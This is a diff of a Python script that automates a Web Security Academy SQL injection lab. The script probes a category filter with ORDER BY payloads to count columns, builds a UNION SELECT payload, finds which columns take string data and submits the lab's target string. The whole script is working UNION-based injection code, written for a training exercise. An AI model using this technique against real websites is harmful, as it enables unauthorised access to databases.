@@ -2,22 +2,25 @@
 #replace url with lab url similar to one seen below
 import requests
 #url = 'https://ac101f911ebb51778049188000010041.web-security-academy.net/filter?category=Accessories'
-url = 'https://aca91f781e2163b28052654c008f004d.web-security-academy.net/filter?category=Accessories'
+url = 'https://acf91f5e1e4ce1c080272a03007f00ed.web-security-academy.net/filter?category=Accessories'
 sqli_row = ["'+ORDER+BY+",
             "'+UNION+SELECT+"]
 used_attack_r = []
 nulls = ""
 valid_rows = 0
+final_attack = ""
+compatible_col = []
 session = requests.Session()
 
 try:
     r = session.get(url=url)
+    print(r)
 except Exception as e:
     print(e)
     exit()
 
 def find_rows():
-    global nulls,valid_rows,r
+    global nulls,valid_rows,r, final_attack
     if r.status_code == 200:
         for x in range(1,100):
             attack_url = url[:url.rfind("=")+1]+sqli_row[0]+str(x)+"--"
@@ -29,19 +32,31 @@ def find_rows():
                 print(used_attack_r[x-2])
                 for y in range(x-1):
                     nulls += "NULL,"
+                final_attack = url[:url.rfind("=")+1]+sqli_row[1]+nulls[:len(nulls)-1]+"--"
+                print(final_attack)
                 break
-def finish_it():
-    final_attack = url[:url.rfind("=")+1]+sqli_row[1]+nulls[:len(nulls)-1]+"--"
-    print(final_attack)
+
+def check_columns():
+    global r, final_attack, compatible_col
+    for x in range(valid_rows):
+        s = final_attack.split(',')
+        s[x] = s[x].replace('NULL', "'a'")
+        r = session.get(url=(',').join(s))
+        if r.status_code == 200:
+            compatible_col.append(x+1)
+            print("Column %s is comaptible" % str(x+1))
+            final_attack = (',').join(s)
+            print(final_attack)
 
 def pass_lab_check():
-    r = session.get(url=final_attack)
+    print(final_attack.replace("'a'","'SLrvzD'")) #replace with required string
+    r = session.get(url=final_attack.replace("'a'","'SLrvzD'"))
     if "Congratulations, you solved the lab!" in r.text:
         print("lab passed")
 
 def main():
     find_rows()
-    finish_it()
+    check_columns()
     pass_lab_check()
 
 if __name__ == '__main__':
